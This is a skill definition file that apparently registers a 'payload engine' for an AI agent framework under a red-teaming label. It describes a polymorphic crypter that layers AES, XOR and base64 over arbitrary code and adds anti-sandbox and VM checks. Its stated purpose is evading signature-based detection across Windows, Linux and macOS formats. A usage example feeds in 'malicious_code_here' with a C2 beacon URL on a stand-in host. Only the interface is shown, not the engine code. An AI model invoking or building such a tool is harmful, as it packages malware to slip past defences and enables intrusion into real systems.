---
name: payload_engine
description: >
  Polymorphic encryption engine using AES-256-GCM + XOR + base64 with runtime decoder.
  Generates obfuscated payloads in PowerShell, Python, Bash, Go, Node.js, C, DLL, ELF, and Mach-O formats.
triggers:
  - payload generate
  - polymorphic encrypt
  - encoded shell
  - stub generator
  - crypter
category: red_teaming
auto_generated: false
enabled: true
metadata:
  created_at: "2026-08-27"
  agent: agents.specialized.payload_engine.PayloadEngine
---

# Polymorphic Payload Engine

Generates polymorphically encrypted payloads with runtime decoders in multiple formats.

## Purpose
Create obfuscated payloads that evade signature-based detection using layered encryption (AES-256-GCM + XOR + base64).

## Usage
```python
from agents.specialized.payload_engine import PayloadEngine

engine = PayloadEngine()
# Generate stub in multiple formats
stubs = engine.generate_all_formats("malicious_code_here", "http://c2.example.com/beacon")
for fmt, code in stubs.items():
    print(f"=== {fmt} ===")
    print(code)

# Or single format
python_stub = engine.generate_stub(encrypted, fmt="python")
```

## Supported Formats
- **powershell**: Windows PowerShell one-liner
- **python**: Python 3 executor
- **bash**: Bash script with inline decode
- **go**: Go binary source
- **nodejs**: Node.js script
- **c**: C source (compiles to DLL/ELF/Mach-O)
- **dll**: Windows DLL stub
- **elf**: Linux ELF binary
- **macho**: macOS Mach-O binary

## Encryption Pipeline
1. AES-256-GCM encryption (or XOR fallback)
2. Base64 encoding
3. Randomized runtime decoder injection
4. Anti-sandbox checks (time, env vars, VM detection)
